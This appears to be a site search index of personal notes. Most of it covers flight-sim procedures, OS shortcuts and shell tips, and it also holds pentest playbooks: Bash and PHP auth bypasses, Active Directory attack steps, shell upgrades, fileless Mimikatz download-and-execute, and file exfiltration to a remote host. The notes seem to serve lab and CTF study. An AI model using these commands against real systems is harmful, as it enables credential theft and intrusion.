{"searchDocs":[{"title":"Bash","type":0,"sectionRef":"#","url":"/docs/languages/bash","content":"","keywords":"","version":"Next"},{"title":"Pattern matching comparison​","type":1,"pageTitle":"Bash","url":"/docs/languages/bash#pattern-matching-comparison","content":" This comparisson is making a pattern matching instead of a string equality comparisson.  if [[ $DB_PASS == $USER_PASS ]]; then   This leads to the issue that the user does not need to know the value of DB_PASS to go through this if. If USER_PASS is *, the if will evaluate to true. This leads to a even worse situation, we can brute force the value of the variable by adding characters to the variable, e.g:  a* -&gt; Password succed -&gt; First char is a, let's try next char ... ab* -&gt; Password succeed -&gt; We know the password is ab, etc...  And repeat this process until all chars are revealed. ","version":"Next","tagName":"h2"},{"title":"Reference","type":0,"sectionRef":"#","url":"/docs/flight-sim/dcs/su25t","content":"","keywords":"","version":"Next"},{"title":"Starting up and take-off​","type":1,"pageTitle":"Reference","url":"/docs/flight-sim/dcs/su25t#starting-up-and-take-off","content":" Operation\tKeyboardCabin light\tL Close cabin\tCtrl Left + C Start/Stop electric power\tShift Right + L Navigation lights\tCtrl Right + L Right engine start\tCtrl Right + Start Left engine start\tAlt Right + Start Take-off/Landing flaps\tShift Left + F Normal flaps\tF Aerodynamic break\tB Landing gear\tG Wheel breaks\tW Radio\tÇ  ","version":"Next","tagName":"h2"},{"title":"Landing​","type":1,"pageTitle":"Reference","url":"/docs/flight-sim/dcs/su25t#landing","content":" Keep vertical speed between 1 and 5 meters  Keep airspeed &lt; 300 kmh  Operation\tKeyboardTake-off/Landing flaps\tShift Left + F Landing gear\tG Wheel breaks\tW Breaking parachute (1 usage only)\tP Right engine stop\tCtrl Right + End Left engine stop\tAlt Right + End  ","version":"Next","tagName":"h2"},{"title":"Navigation​","type":1,"pageTitle":"Reference","url":"/docs/flight-sim/dcs/su25t#navigation","content":" MPW/ENR: Waypoint modeB3B/RTN: Return to base modeMOC/LDNG: Landing mode  Operation\tKeyboard\tNotesNavigation HUD\t1 Next waypoint\tCtrl Left + º AP keep altitude\tAlt Left + 1 or H AP keep altitude and roll\tAlt Left + 2 AP keep level flight\tAlt Left + 3 AP keep radar altitude\tAlt Left + 4\tUseful for very low fligh AP keep barometric altitude\tAlt Left + 5 AP follow route\tAlt Left + 6 or A AP disable any\tAlt Left + 9\t  ","version":"Next","tagName":"h2"},{"title":"Air to ground mode​","type":1,"pageTitle":"Reference","url":"/docs/flight-sim/dcs/su25t#air-to-ground-mode","content":" Operation\tKeyboard\tNotesAir to ground mode\t7\t3MN symbol appears in HUD Change weapon\tD Enable shkival\tO Enable Laser\tShift Right + O\tYou need to remember if the weapon needs laser * Enable Anti-Radar (Fantasmagoria)\tI Discharge amount\tCtrl + backspace Drop interval\tV Gunpod\tC\t  * Check the last letter of the weapon symbol, T means TV, L means laser  ","version":"Next","tagName":"h2"},{"title":"Bombs​","type":1,"pageTitle":"Reference","url":"/docs/flight-sim/dcs/su25t#bombs","content":" There are two modes of dropping an un-guided bomb: https://www.openflightschool.de/mod/book/view.php?id=792  The symbol b appears in the HUD when a bomb is selected.  CCIP​  Continuously Computed Impact Point.  Deep dive into the objective  A vertical line will appear, when the piper is in the objective trigger the joystick  CCRP​  Continuously Computed Release Point.  Flight level and point the piper where you want to drop the bomb.  Press the joystick trigger and keep flying leveled towards the point.  There's a distance indicator in the left side of the HUD, when the indicator reaches the lowest point, the bomb will be released automatically.  ","version":"Next","tagName":"h3"},{"title":"Missiles​","type":1,"pageTitle":"Reference","url":"/docs/flight-sim/dcs/su25t#missiles","content":" Point the skhrval sensor to the target.  Make the reticule smaller as possible and adapt the size of the reticule to the kind of target:  MANPAD: 5mTank: 10mBuilding: 30-60m  When shkrval acquires the lock, you will see NP (Launch authorized).  With the vickr missiles you don't actually need the lock, they will follow the laser. If you spot something before the locking, you can shoot as soon as you are in the required distance.  ","version":"Next","tagName":"h3"},{"title":"Air to air mode​","type":1,"pageTitle":"Reference","url":"/docs/flight-sim/dcs/su25t#air-to-air-mode","content":" Operation\tKeyboard\tNotesAir to air mode\t6\tOTN symbol appears in HUD Gunpod\tC\tPlace the target aircraft in the middle of the symbol wings ","version":"Next","tagName":"h2"},{"title":"SQLite","type":0,"sectionRef":"#","url":"/docs/Hacking/Tooling/sqlite","content":"SQLite Enter the database: ``shell sqlite3 users.db Show all tables: ```shell SELECT name FROM sqlite_master WHERE type='table'; Show table schema: .schema table_name ","keywords":"","version":"Next"},{"title":"General","type":0,"sectionRef":"#","url":"/docs/flight-sim/dcs","content":"General This article contains general knowledge and operations about DCS flight sim. Operation\tKeyboardSpeed up time\tCTRL Left + Z Reset time\tShift Left + Z Radio\tÇ Cabin light\tL","keywords":"","version":"Next"},{"title":"PHP","type":0,"sectionRef":"#","url":"/docs/languages/php","content":"","keywords":"","version":"Next"},{"title":"Type juggling​","type":1,"pageTitle":"PHP","url":"/docs/languages/php#type-juggling","content":" Due to the nature of PHP we can abuse the type jungling feature. When comparing variables of different types, PHP will convert them to a common, comparable type.  The following condition will be true and print the message.  $example_int = 7 $example_str = &quot;7&quot; if ($example_int == $example_str) { echo(&quot;PHP can compare ints and strings.&quot;) }   An if with == will not check the types. Only === check the types.  If the string to be compared does not contain an integer, it will be converted to 0, e.g:  (&quot;Puppies&quot; == 0) -&gt; True   So, if you see some compraison with PHP is worth trying to exploit this vulnerability  Applying this to the security world, we can bypass auth by using this loose comparison:  if ($_POST[&quot;password&quot;] == &quot;Admin_Password&quot;) {login_as_admin();}   Then, to bypass the auth the user only need to provide 0 integer as input:  (0 == “Admin_Password”) -&gt; True   Reference: https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09  ","version":"Next","tagName":"h2"},{"title":"strcmp​","type":1,"pageTitle":"PHP","url":"/docs/languages/php#strcmp","content":" The strcmp method is also affected by the loose comparison.  if(strcmp($PASSWORD, $_GET['password']) == 0){ $success = true; }   Thanks to the type juggling describe above, if strcmp returns NULL the condition will be true. We can force this by passing the password field as an array:  http://yrmyzscnvh.abctf.xyz/web6/?password[]=%22%22   Reference: https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016 ","version":"Next","tagName":"h2"},{"title":"Improve shell","type":0,"sectionRef":"#","url":"/docs/playbooks/improve-shell","content":"","keywords":"","version":"Next"},{"title":"When python is available​","type":1,"pageTitle":"Improve shell","url":"/docs/playbooks/improve-shell#when-python-is-available","content":" In order to get a better shell, we could the following commands:  python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)' export TERM=xterm ctrl + z stty raw -echo; fg   You can find mmore methods to improve the shell here https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/  ","version":"Next","tagName":"h2"},{"title":"No python available​","type":1,"pageTitle":"Improve shell","url":"/docs/playbooks/improve-shell#no-python-available","content":" script /dev/null -c bash   or  stty raw -echo; fg  ","version":"Next","tagName":"h2"},{"title":"Pentesting Windows","type":0,"sectionRef":"#","url":"/docs/playbooks/pentesting-windows","content":"","keywords":"","version":"Next"},{"title":"Enumeration​","type":1,"pageTitle":"Pentesting Windows","url":"/docs/playbooks/pentesting-windows#enumeration","content":" nmapSMBLDAP dumpAD using BloodHound and analyze output of BloodHound with its UI and find shortest path to valuable assetsMS-SQL xp_dirtree  ","version":"Next","tagName":"h2"},{"title":"Getting foothold​","type":1,"pageTitle":"Pentesting Windows","url":"/docs/playbooks/pentesting-windows#getting-foothold","content":" Brute force users via SMB with crackmapexecPassword spray the users with crackmapexecConnect with evil-winrm (SSH equivalent)Shadow credential: when a user has write access to another user KeyCredentialLink, the user can write its public key material to it, forcing AD to send the NTLM token to the attacker. Use certipy-ad shadow auto to perform this kind of attack.  ","version":"Next","tagName":"h2"},{"title":"Privilege escalation​","type":1,"pageTitle":"Pentesting Windows","url":"/docs/playbooks/pentesting-windows#privilege-escalation","content":" certipy: check if the user you have at this point has Manage Certificates or Manage CA. If it have it, you can use certify to issues an Administrator certificate to be used to leak NTLM hash.PEAS-ng: https://github.com/carlospolop/PEASS-ngicacls: check permission of files ","version":"Next","tagName":"h2"},{"title":"F5E","type":0,"sectionRef":"#","url":"/docs/flight-sim/dcs/f5e","content":"","keywords":"","version":"Next"},{"title":"Procedures​","type":1,"pageTitle":"F5E","url":"/docs/flight-sim/dcs/f5e#procedures","content":" ","version":"Next","tagName":"h2"},{"title":"Engine start-up​","type":1,"pageTitle":"F5E","url":"/docs/flight-sim/dcs/f5e#engine-start-up","content":" From the aircraft completely stopped to engines started  Operation\tControlBattery switch on\tMouse click Left and right generator switches ON\tMouse click Left and right fuel pump ON\tMouse click Set UHF Frequency to BOTH\tMouse click Request ATC Engine startup\tç -&gt; F5 -&gt; F1 Request Ground crew compressed air supply (connect)\tç -&gt; F8 -&gt; F5 -&gt; F1 Request Ground crew compressed air supply (supply)\tç -&gt; F8 -&gt; F5 -&gt; F3 Once left engine engine reaches 10%, start engine\tRight Alt + Home Let engine stabilise (30s) to the following params\tVisual  tip Normal engine operation values IDLE RPM: 50% Exhaust Gas Temperature: &gt; 140 ºC Nozzle position: 60-79 % Fuel flow: 400 pph Oil pressure: 5-20 psi Hydraulic and flight control pressure: 2800-3200 psi  Operation\tControlCheck AUX intake left is OPEN (barber pole)\tVisual Repeat procedure for right engine Request Ground crew compressed air supply (supply)\tç -&gt; F8 -&gt; F5 -&gt; F3 Once right engine engine reaches 10%, start engine\tRight Shift + Home Stabilise and wait (30s) for normal engine operation values\tVisual Check both AUX intake are OPEN\tVisual  ","version":"Next","tagName":"h3"},{"title":"Post start-up​","type":1,"pageTitle":"F5E","url":"/docs/flight-sim/dcs/f5e#post-start-up","content":" The aircraft will be ready to taxi after this step  Operation\tControlDisconnect compressed air supply\tç -&gt; F8 -&gt; F5 -&gt; F2 Set yaw and pitch dumper\tMouse click Set oxygen supply ON\tMouse click Confirm air flow\tVisual Retract air brakes (FWD position)\tB Set flap mode switch to THUMB SW\tMouse click Set flaps position to FULL\tF Trim elevator pitch\tJoystick  tip Trim values Empty: 6Tanks + gun + missiles: 7Tanks + gun + missile + bombs + rockets: 8  Operation\tControlReset the altimeter and set barometric pressure to QNH in briefing\tMouse Primary and secondary attitude indicator trim -3 degress\tMouse Power/search button in RWR\tMouse click Fuel autobalance switch to the side with less fuel\tMouse click Pitot switch ON\tMouse click Engine de-icing ON\tMouse click Disable master caution\tMouse click Set Exterior NAV lights (BRT)\tMouse click Set Formation lights (BRT)\tMouse click Set Beacon lights (BRT)\tMouse click Set radar OFF\tMouse click Set chaff/flare selector to SINGLE\tMouse click Set IFF transpoder code\tMouse click Remove wheel chocks\tç -&gt; F8 -&gt; F4 -&gt; F2 Close canopy\tLeft Control + C  The aircraft is ready to taxi  ","version":"Next","tagName":"h3"},{"title":"Taxi to runway​","type":1,"pageTitle":"F5E","url":"/docs/flight-sim/dcs/f5e#taxi-to-runway","content":" Moving the aircraft from parking to the runway  Operation\tControlRequest ATC Taxi\tç -&gt; F5 Set Taxi/Landing lights (BRT)\tMouse click Throttle to 65-70 %\tHOTAS Axis Nose wheel steering button to turn the aircraft\tJoystick Turn the aircraft using pedals\tHOTAS Pedals Throttle to 55-60 % during taxi\tHOTAS Axis  ","version":"Next","tagName":"h3"},{"title":"Takeoff​","type":1,"pageTitle":"F5E","url":"/docs/flight-sim/dcs/f5e#takeoff","content":" The aircraft is waiting to enter the runway.  Operation\tControlRequest ATC clearance to enter the runway\tç -&gt; F5 Check both sides when entering the runway\tVisual Taxi/Landing lights OFF\tMouse click Check takeoff speed from table\tVisual Check elevator trim\tVisual Align with runway\tHOTAS Pedals Check magnetic compass with expected heading\tVisual Set Radar to STBY\tMouse click Set Nose struct\tMouse click Check flaps AUTO and brake retracted (FWD)\tVisual Hold break and thrust to 95% and let stabilise\tHOTAS button + HOTAS axis Release break and full throttle\tHOTAS axis Rotate at expected speed\tJoystick Check Angle-Of-Attack to see speed and altitude increase\tVisual When climb rate is positive, retract landing gear\tHOTAS button or G MIL power (90% throttle)\tHOTAS axis Check climb speed no less than 300kt\tVisual Fuel autobalance switch to the side with less fuel\tMouse click  ","version":"Next","tagName":"h3"},{"title":"Approach and landing​","type":1,"pageTitle":"F5E","url":"/docs/flight-sim/dcs/f5e#approach-and-landing","content":" Fly downwind leg over the airport. The approach starts at 3NM and must be performed at the beginning at 300kt and 1500ft altitude.  Operation\tControlCalculate landing speed index and set it\tMouse Check barometric pressure of the landing airport\tVisual Start at 3NM, 300kt and 1500ft altitude\tVisual Set flaps to AUTO\tF Fly the downwind leg and slowdown to 260kt When speed is lower than 260kt, deploy landing gear\tG Check landing gear three lights are green\tVisual Slowdown to 160kt, keep 1500ft altitude\tB Turn to take landing course Lose altitude at -1000ft/min vertical speed and 145kt Reduce vertical speed to -400ft/min on the final Check Angle-Of-Attack lights to be ok (green)\t  tip AoA landing indicator ⬇️: too slow, speed up0️⃣: On correct speed⬆️: too fast, slow down  Operation\tControlCalculate landing speed index and set it\tMouse At 20ft flare and land at landing speed (e.g. 135kt) Apply wheel breaks\tHOTAS button Deploy parachute\tP  ","version":"Next","tagName":"h3"},{"title":"TACAN: instrument navigation and landing​","type":1,"pageTitle":"F5E","url":"/docs/flight-sim/dcs/f5e#tacan-instrument-navigation-and-landing","content":" TACAN is the military equivalent of civil VOR nagivation. And the landing procedure is a little bit different  Approach distance calculation​  The approach will be performed at 2400ft and 300kt.  For landing, we first must compute the distance of the TACAN where the descend must start, to do so:  Current altitude - 2400ft will give the required descent altitude. E.g:  6000ft - 2400ft = 3600ft   Assuming a descent speed of 300kt and vertical speed of 2000ft/min, we can compute the distance to start the descend by:  Distance = Current altitude - airport altitude / 100 / 4, e.g:  Distance = 6000 - 2400 = 3600 / 100 = 36 / 4 = 9 NM   Then, we add 5 NM to align with the correct course and we have to start descending to approach altitude at 9 + 5 = 14 NM.  Entering downwind leg​  We land facing the wind with the cockit, the wind will make breaking the aircraft easier. In order to do so, we must fly the downwind leg and turn 180º to land.  When we reach the TACAN station at the airport, we must add 23º to the course to enter the landing course. e.g:  Landing at runway 27: 268º The reverse course is: 268 - 180 = 88º We add 23º to that: 88º + 23º = 111º   When reaching the TACAN, keep the same course for 2 NM for clear reads of TACAN signals, then configure the course to the previously computed (111º)  Fly for 13NM in 111º and turn left to landing course of 268º.  Remember to keep 2400ft and 300kt all the time.  Descending the approach​  While on landing course, slowdown to 260kt and take out the landing the gear.  tip Calculating landing speedDepends on the weight of the aircraft (fuel + ammunition): Fuel weights 1000 pounds and no ammo: 145ktMore than 1000 pounds of fuel: increase 1kt per each 200 poundsGun ammo full: add another 5kt  Keep landing speed plus 20kt during the descend phase.  When distance to TACAN is 8NM, start descending with vertical speed of 600-700 ft/min.  At 1200ft of altitude, TACAN should read 4NM of distance. You must manouver to find the optimal glide path.  ","version":"Next","tagName":"h3"},{"title":"Taxi from runway and park​","type":1,"pageTitle":"F5E","url":"/docs/flight-sim/dcs/f5e#taxi-from-runway-and-park","content":" The aircraft has landed and exited the runway. Now is taxing to the parking.  Operation\tControlDrop parachute at the exit of the runway\tMouse click Cabin pressure dump\tMouse click Apply air breaks, flaps UP\tB and F Disable Radar\tMouse click Disable gunsight\tMouse click Disable pitot heating\tMouse click Open canopy\tMouse click Disable remaining switches\tMouse click Throttle set to OFF in both engines\tRight ALT + End and Right Shit + End Pull to cage instruments\tMouse click Turn OFF fuel pumps\tMouse click Turn OFF generator\tMouse click Turn OFF battery\tMouse click  ","version":"Next","tagName":"h3"},{"title":"Weapons​","type":1,"pageTitle":"F5E","url":"/docs/flight-sim/dcs/f5e#weapons","content":" ","version":"Next","tagName":"h2"},{"title":"Air to air​","type":1,"pageTitle":"F5E","url":"/docs/flight-sim/dcs/f5e#air-to-air","content":" MSL mode​  MSL stands for Missile mode.  MSL mode is used to fire air-to-air missile. F5E can use AIM-9 which are heat seaking missiles.  Operation\tControlSelect MSL mode in gunsight\tMouse click Radar OPER\tMouse click Arm AIM-9 pylons\tMouse click Arm master arms switch\tMouse click  Now the AIM-9 will start a growl noise that will be interrupted when they find a source of heat. Now we should use the Radar to find targets.  Operation\tControlStart searching for targets with the radar at 40NM range\tRadar range button Tilt the antena from +10 to -10 degress\tRadar antena tilt button If something appears change to 20NM range. The ACQ cursor appear\tRadar range button Put the ACQ cursor on top of the target symbol in the redar\tTDC Disengage afterburner\tThrust lever Attempt to lock. It will not lock until close to 10NM\tTDC button If the target is locked, you'll see LK ON light. If not, you must resume the search\tRadar resume search button When the target is locked, increase throttle to afterburner\tThrust lever If it's locked, wait for IN RANGE light\tVisual Point the gunsight to source of heat, when the AIM-9 changes the sounds, fire it\tArms-Bombs release button  DM mode​  DM stands for Dogfight Missile mode. It's useful when the target is really close and we want to shoot a missile. The radar scanning is as always, start at 40NM, tilt the antena until the target is at 10NM range.  Operation\tControlSet radar search to 10NM\tRadar range button Enable master arms\tMouse click Enable AIM-9 pylons\tMouse click Set gunsight to MSL\tMouse click When the target is at 5NM keep the target is the center line of radar\tVisual Climb at the same rate as the antena tilt, e.g. 10º\tVisual Enable DM mode\tHOTAS button The target is locked automatically\tVisual Manouver to keep the target in the Radar reticule until is visually found\tVisual Keep the target in the gunsight until IN RANGE signal appears\tVisual Fire the missile. If the target is manouvering, you should use missile uncage button\tHOTAS button  DG and AA/1 mode​  DG stands for Dogfight guns mode. It's useful when we want to fire guns to a manouvering target at different speeds, typically a fighter.  Operation\tControlSet radar search to 10NM\tRadar range button Enable master arms\tMouse click Set gunsight to AA/1\tMouse click Search as usually with the Radar\tVisual When target is at range (0.9NM) or the last line of Radar, select DG mode\tHOTAS button The target will be locked up automatically\tVisual Keep the target in the center of the gunsight and wait for IN RANGE\tVisual When IN RANGE, point the gunsight center at the body of the target and fire\tJoystick trigger  AA/2 mode​  AA/2 mode is useful for manouvering targets at constant speed, i.e. bombers  Operation\tControlSet radar search to 10NM\tRadar range button Enable master arms\tMouse click Set gunsight to AA/2\tMouse click Search as usually with the Radar\tVisual When target is at range (0.9NM) or the last line of Radar, select Radar ACQ\tRadar ACQ button The target will be locked, if not, resume search\tResume search button Keep the target in the center of the gunsight and wait for IN RANGE\tVisual When IN RANGE, point the gunsight center at the body of the target and fire\tJoystick trigger  ","version":"Next","tagName":"h3"},{"title":"Air to ground​","type":1,"pageTitle":"F5E","url":"/docs/flight-sim/dcs/f5e#air-to-ground","content":" Bombs​  The F5E is only capable of deliver dumb bombs. In order to do so, you must do a dive bombing and use the altitude, speed parameters and the gunsight to calculate when to drop the bombs.  The dive has to be done under the following parameters:  Operation\tValueSet gunsight to MAN\tMAN Set reticule depresion\t80 MILS Enable master arms\tMouse click Weapon type select Bombs\tMouse click Select bombs pylon\tMouse click Select any bomb fuse option but SAFE\tMouse click Dive altitude start\t5000ft + target altitude Dive speed start\t350kt Dive angle\t20º Drop bomb altitude\t3200ft Drop bomb speed\t400kt  The flight manual contains all sorts of parameters for different dive angles.  Rockets and guns​  Using rockets and guns to attack ground targets is similar to using bombs. They rely on a dive to release them. The parameters are similar to dive bombing:  Operation\tValueSet gunsight to MAN\tMAN Set reticule depresion\t14 MILS Enable master arms\tMouse click External stores select Rockets\tMouse click Select rockets pylon\tMouse click Dive altitude start\t5000ft + target altitude Dive speed start\t350kt Dive angle\t20º Drop bomb altitude\t3200ft Drop bomb speed\t400kt  For using guns, the only difference is that 12 MILS should be configured as reticule depression.  Laser guided bombs​  The F5E is capable of deliver GBU-12 laser guided bombs where an operator (JTAC) is iluminating the target with laser light. Typically this is done by some ground unit.  Operation\tValueSpeak with JTAC via UHF radio\tRight ALT + ç Select JTAC and check-in time\tF4 JTAC will give 9 lines attack vector to communicate where is the target Use map to locate the target using the 9 lines coordinates\tF10 Enable master arms\tMouse click Select GBU switches\tMouse click Select bombs in External stores\tMouse click Select any bomb fuse but SAFE\tMouse click Once the Ingress Point (IP) is known, navigate to it and inform JTAC\tRight ALT + ç After reaching the IP, the aircraft should be at 3000ft, 400kt Ask JTAC to deploy smoke on the target\tRight ALT + ç Confirm the smoke can be seen to JTAC\tRight ALT + ç Ask JTAC to illuminate the target with laser\tRight ALT + ç Keep the target between the left cannon and the gunsight camera\tVisual Drop the bomb when close to the target\tWeapon release button ","version":"Next","tagName":"h3"},{"title":"Mac OS","type":0,"sectionRef":"#","url":"/docs/Shortcuts/Mac OS","content":"Mac OS Shortcut\tDescriptionCurrent application to fullscreen\tcontrol + CMD + F Move between fullscreen apps\tcontrol + Arrow right/left Finder go to folder\tCMD + Shift + G Finder see hidden files\tCMD + Shift + . Finder copy and paste\tCMD + C + CMD + V Finder copy and move\tCMD + C + CMD + option + V","keywords":"","version":"Next"},{"title":"Chrome","type":0,"sectionRef":"#","url":"/docs/Shortcuts/Chrome","content":"Chrome Shortcut\tDescriptionNew tab\tCMD + t Next tab\toption + CMD + Arrow right/left Go to tab 1\tCMD + 1 Go to tab 2\tCMD + 2","keywords":"","version":"Next"},{"title":"Useful commands","type":0,"sectionRef":"#","url":"/docs/linux-useful-commands","content":"","keywords":"","version":"Next"},{"title":"Environment variables by variable​","type":1,"pageTitle":"Useful commands","url":"/docs/linux-useful-commands#environment-variables-by-variable","content":" Imagine we need to access the contents of an environment variable, but its name is stored in another variable.  For example:  DEV_AWS_ACCESS_KEY_ID=&quot;1234-dev&quot; RD_AWS_ACCESS_KEY_ID=&quot;abcd-prd&quot;   This could happen for instance while configuring multiple AWS in a CI system.  Let's continue with the example, the CI system provide a variable called &quot;stage&quot;, which can be dev or prd; then we want to prepend the content of this variable to get the credentials to the proper account:  CUR_ENV=`echo ${stage} | tr a-z A-Z` ENV_ACCESS_KEY=&quot;${CUR_ENV}_AWS_ACCESS_KEY_ID&quot;   Now the magic comes, if this the shell is based in bash, we could the technique called as &quot;variable indirection&quot;, like this:  ACTUAL_KEY=echo ${!ENV_ACCESS_KEY}   However, this will not work on all the shells, a more general solution could be:  eval ACTUAL_KEY=\\$$ENV_ACCESS_KEY   However, there might be security implications by using eval  ","version":"Next","tagName":"h2"},{"title":"Check if there are git changes in script​","type":1,"pageTitle":"Useful commands","url":"/docs/linux-useful-commands#check-if-there-are-git-changes-in-script","content":" In a CI pipeline, you might want to check if there are changes to create an automatic commit, etc.  You can do that by running the following snippet:  git diff-index --quiet HEAD ANY_CHANGE=$? [ $ANY_CHANGE -ne 0 ] &amp;&amp; echo &quot;Do something with the change&quot;   ","version":"Next","tagName":"h2"},{"title":"See strings in binary file​","type":1,"pageTitle":"Useful commands","url":"/docs/linux-useful-commands#see-strings-in-binary-file","content":" strings login.php.swp  ","version":"Next","tagName":"h2"},{"title":"Active Directory","type":0,"sectionRef":"#","url":"/docs/playbooks/active-directory","content":"","keywords":"","version":"Next"},{"title":"Powershell​","type":1,"pageTitle":"Active Directory","url":"/docs/playbooks/active-directory#powershell","content":" All the commands listed here as supposed to be executed from a Windows machine with access to powershell. Similar actions can be executed from a Linux machine but with other commands.  Reference: https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps  ","version":"Next","tagName":"h2"},{"title":"Users​","type":1,"pageTitle":"Active Directory","url":"/docs/playbooks/active-directory#users","content":" Add to the domain   New-ADUser -Name &quot;Orion Starchaser&quot; -Accountpassword (ConvertTo-SecureString -AsPlainText (Read-Host &quot;Enter a secure password&quot;) -Force ) -Enabled $true -OtherAttributes @{'title'=&quot;Analyst&quot;;'mail'=&quot;o.starchaser@inlanefreight.local&quot;} -ChangePasswordAtLogon $true   Add to particular organization unit  New-ADUser -Name &quot;KarimBuzdar&quot; -GivenName &quot;Karim&quot; -Surname &quot;Buzdar&quot; -SamAccountName &quot;kbuzdar&quot; -UserPrincipalName &quot;kbuzdar@faqforge.com&quot; -Path &quot;OU=Users,DC=faqforge,DC=com&quot; -AccountPassword (ConvertTo-SecureString &quot;P@ssw0rd!&quot; -AsPlainText -Force) -Enabled $true   Remove-ADUser -Identity pvalencia   Get a particular user  Get-ADUser -Identity m.ohare   Get all users in organization unit:  Get-ADUser -Filter * -SearchBase &quot;OU=Finance,OU=UserAccounts,DC=FABRIKAM,DC=COM&quot;   Search for user with a filter:  Get-ADUser -Filter 'Name -like &quot;*SvcAccount&quot;' | Format-Table Name,SamAccountName -A   Get all properties:  Get-ADUser -Identity amasters -Properties *   ","version":"Next","tagName":"h3"},{"title":"Unlock account​","type":1,"pageTitle":"Active Directory","url":"/docs/playbooks/active-directory#unlock-account","content":" Unlock account:  Unlock-ADAccount -Identity amasters   Set new password:  Set-ADAccountPassword -Identity amasters -NewPassword (ConvertTo-SecureString -AsPlainText &quot;qwert@12345&quot; -Force)   Force change password after next logon:  Set-ADUser -Identity amasters -ChangePasswordAtLogon $true   ","version":"Next","tagName":"h3"},{"title":"Organization unit​","type":1,"pageTitle":"Active Directory","url":"/docs/playbooks/active-directory#organization-unit","content":" Create a new OU under some path  New-ADOrganizationalUnit -Name &quot;Analysts&quot; -Path &quot;OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;   Move created user to the new created OU  Move-ADObject -Identity a.callisto -TargetPath &quot;OU=Analysts,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;   or by Common name:  Move-ADObject -Identity &quot;CN=a.callisto,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot; -TargetPath &quot;OU=Analysts,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;   ","version":"Next","tagName":"h3"},{"title":"Security group​","type":1,"pageTitle":"Active Directory","url":"/docs/playbooks/active-directory#security-group","content":" New-ADGroup -Name &quot;Security Analysts&quot; -SamAccountName analysts -GroupCategory Security -GroupScope Global -DisplayName &quot;Security Analysts&quot; -Path &quot;OU=Analysts,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot; -Description &quot;Members of this group are Security Analysts under the IT OU&quot;   Add users to the group:  Add-ADGroupMember -Identity analysts -Members ACepheus,OStarchaser,ACallisto   ","version":"Next","tagName":"h3"},{"title":"Security group policy​","type":1,"pageTitle":"Active Directory","url":"/docs/playbooks/active-directory#security-group-policy","content":" Get by name:  Get-GPO -Name &quot;Group Policy Test&quot;   Copy and rename GPO (Group policy Object):  Copy-GPO -SourceName &quot;Logon Banner&quot; -TargetName &quot;Security Analysts Control&quot;   Link the GPO to a OU:  New-GPLink -Name &quot;Security Analysts Control&quot; -Target &quot;ou=Analysts,ou=IT,OU=HQ-NYC,OU=Employees,OU=Corp,dc=INLANEFREIGHT,dc=LOCAL&quot; -LinkEnabled Yes   To edit the security group policy it's better to do it from the UI, using the Group Policy Management Center (GPMC) available in Server Management &gt; Tools.  ","version":"Next","tagName":"h3"},{"title":"Computer​","type":1,"pageTitle":"Active Directory","url":"/docs/playbooks/active-directory#computer","content":" Add a computer to the domain, credentials refer to the user whose credentials we will use to authorize the join:  Add-Computer -DomainName 'INLANEFREIGHT.LOCAL' -Credential 'INLANEFREIGHT\\HTB-student_adm' -Restart   That command must be run from the computer that did not join the domain yet.  You can do the same but remotely:  Add-Computer -ComputerName ACADEMY-IAD-W10 -LocalCredential ACADEMY-IAD-W10\\image -DomainName INLANEFREIGHT.LOCAL -Credential INLANEFREIGHT\\htb-student_adm -Restart   We can we the details of a computer in the domain by running:  Get-ADComputer -Identity &quot;name&quot; -Properties * | select CN,CanonicalName,IPv4Address   You can move the computer to another OU by running:  Move-ADObject -Identity &quot;name&quot; -TargetPath &quot;OU=Analysts,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;   ","version":"Next","tagName":"h3"},{"title":"Bash​","type":1,"pageTitle":"Active Directory","url":"/docs/playbooks/active-directory#bash","content":" Add one user to a group on behalf of another user (-U)  net rpc group addmem &quot;SERVICE ACCOUNTS@FLUFFY.HTB&quot; &quot;p.agila&quot; -U &quot;fluffy.htb&quot;/&quot;P.AGILA&quot;%&quot;prometheusx-303&quot; -S 10.10.11.69 ``  ","version":"Next","tagName":"h2"},{"title":"File transfer","type":0,"sectionRef":"#","url":"/docs/playbooks/file-transfer","content":"","keywords":"","version":"Next"},{"title":"Base64 encode/decode​","type":1,"pageTitle":"File transfer","url":"/docs/playbooks/file-transfer#base64-encodedecode","content":" If the payload to transmit is small enough, do base64 encode/decode and later check md5 hashes match  base64 -w0 &lt;file&gt; #Encode file base64 -d file #Decode file   ","version":"Next","tagName":"h2"},{"title":"Powershell​","type":1,"pageTitle":"File transfer","url":"/docs/playbooks/file-transfer#powershell","content":" Complete reference: https://gist.github.com/HarmJ0y/bb48307ffa663256e239  (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\\Users\\Public\\Downloads\\PowerView.ps1')   Fileless method: it does not touch the disk  IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')   Upload, powershell does not have a native cmdlet to perform HTTP uploads, however we can install this feature  IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1') Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\\Windows\\System32\\drivers\\etc\\hosts   Upload with base64:  $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -Encoding Byte)) Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64   Upload via FTP:  (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\\Windows\\System32\\drivers\\etc\\hosts')   